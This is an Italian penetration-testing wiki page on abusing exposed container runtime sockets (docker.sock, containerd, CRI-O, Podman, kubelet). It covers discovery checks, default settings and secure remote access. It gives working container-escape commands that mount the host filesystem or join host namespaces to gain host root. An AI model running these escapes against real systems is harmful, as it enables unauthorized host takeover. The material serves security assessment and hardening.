# API di runtime e esposizione del daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molte compromissioni reali di container non iniziano affatto con un namespace escape. Iniziano con l'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman, o kubelet tramite un socket Unix montato o un listener TCP esposto, l'attaccante potrebbe essere in grado di richiedere un nuovo container con privilegi più elevati, montare il filesystem host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, la runtime API è il vero confine di sicurezza, e comprometterla è funzionalmente vicino a compromettere l'host.

Per questo motivo l'esposizione del socket del runtime dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con ordinari seccomp, capabilities, e MAC confinement può comunque trovarsi a una chiamata API dal compromettere l'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` sono montati al suo interno. L'isolamento del kernel del container corrente può funzionare esattamente come progettato mentre il management plane del runtime rimane completamente esposto.

## Modelli di accesso al daemon

Docker Engine tradizionalmente espone la sua API privilegiata tramite il socket Unix locale `unix:///var/run/docker.sock`. Storicamente è stata esposta anche in remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto TLS su `2376`. Esporre il daemon in remoto senza TLS forte e autenticazione client equivale a trasformare la Docker API in un'interfaccia root remota.

containerd, CRI-O, Podman, e kubelet espongono superfici con impatto simile. I nomi e i workflow differiscono, ma la logica no. Se l'interfaccia permette al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali o alterare container in esecuzione, l'interfaccia è un canale di gestione privilegiato e dovrebbe essere trattata di conseguenza.

Percorsi locali comuni da verificare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o più specializzati possono anche esporre endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Questi sono meno comuni negli ambienti moderni, ma quando vengono riscontrati vanno trattati con la stessa cautela perché rappresentano superfici di controllo del runtime piuttosto che normali socket applicativi.

## Accesso remoto sicuro

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e preferibilmente con autenticazione mutua, in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di aprire il Docker daemon su HTTP in chiaro per comodità è uno degli errori più pericolosi nell'amministrazione dei container, perché la superficie API è sufficientemente potente da creare direttamente container privilegiati.

Lo schema storico di configurazione di Docker era il seguente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Su host basati su systemd, la comunicazione del daemon può anche apparire come `fd://`, il che significa che il processo eredita una socket pre-aperta da systemd anziché associare direttamente la socket. La lezione importante non è la sintassi esatta ma la conseguenza sulla sicurezza. Nel momento in cui il daemon ascolta oltre una socket locale con permessi ristretti, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie piuttosto che un hardening opzionale.

## Abuso

Se è presente una socket di runtime, conferma quale sia, se esiste un client compatibile e se è possibile l'accesso raw HTTP o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un percorso inesistente, un socket montato ma inaccessibile e un'API privilegiata attiva. Se il client riesce, la domanda successiva è se l'API può avviare un nuovo container con un host bind mount o host namespace sharing.

### Esempio completo: Docker Socket To Host Root

Se `docker.sock` è raggiungibile, la fuga classica è avviare un nuovo container che monta il filesystem root dell'host e poi eseguire `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo fornisce l'esecuzione diretta con privilegi root dell'host tramite il Docker daemon. L'impatto non si limita alla lettura dei file. Una volta all'interno del nuovo container, l'attaccante può modificare i file dell'host, raccogliere credenziali, impiantare persistenza o avviare ulteriori workload privilegiati.

### Esempio completo: Docker Socket To Host Namespaces

Se l'attaccante preferisce l'accesso ai namespace invece dell'accesso limitato al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con esposizione esplicita dell'host-namespace invece di sfruttare quello corrente.

### Esempio completo: containerd Socket

Un socket `containerd` montato è di solito altrettanto pericoloso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impatto è, ancora una volta, il compromesso dell'host. Anche se gli strumenti specifici di Docker sono assenti, un'altra API del runtime potrebbe comunque offrire lo stesso livello di potere amministrativo.

## Checks

Lo scopo di questi controlli è verificare se il container può raggiungere qualsiasi management plane che avrebbe dovuto rimanere al di fuori del perimetro di fiducia.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Cosa c'è di interessante qui:

- Un socket runtime montato è solitamente una primitiva amministrativa diretta piuttosto che una semplice divulgazione di informazioni.
- Un listener TCP su `2375` senza TLS dovrebbe essere considerato una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato intenzionalmente progettato per comunicare con il runtime host.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix locale per impostazione predefinita | `dockerd` ascolta sul socket locale e il daemon è solitamente eseguito come root | montare `/var/run/docker.sock`, esporre `tcp://...:2375`, TLS debole o mancante su `2376` |
| Podman | CLI senza daemon per impostazione predefinita | Per l'uso locale ordinario non è richiesto un daemon privilegiato a lunga durata; gli API socket possono comunque essere esposti quando è abilitato `podman system service` | esporre `podman.sock`, eseguire il servizio in modo esteso, uso dell'API come root |
| containerd | Socket locale privilegiato | API amministrativa esposta tramite il socket locale e solitamente consumata da tooling di livello superiore | montare `containerd.sock`, ampio accesso a `ctr` o `nerdctl`, esporre namespace privilegiati |
| CRI-O | Socket locale privilegiato | L'endpoint CRI è destinato a componenti affidabili locali al nodo | montare `crio.sock`, esporre l'endpoint CRI a workload non affidabili |
| Kubernetes kubelet | API di gestione locale al nodo | Il Kubelet non dovrebbe essere ampiamente raggiungibile dai Pods; l'accesso può esporre lo stato del pod, le credenziali e funzionalità di esecuzione a seconda di authn/authz | montare socket o certificati del kubelet, autenticazione del kubelet debole, host networking e endpoint del kubelet raggiungibile |
{{#include ../../../banners/hacktricks-training.md}}
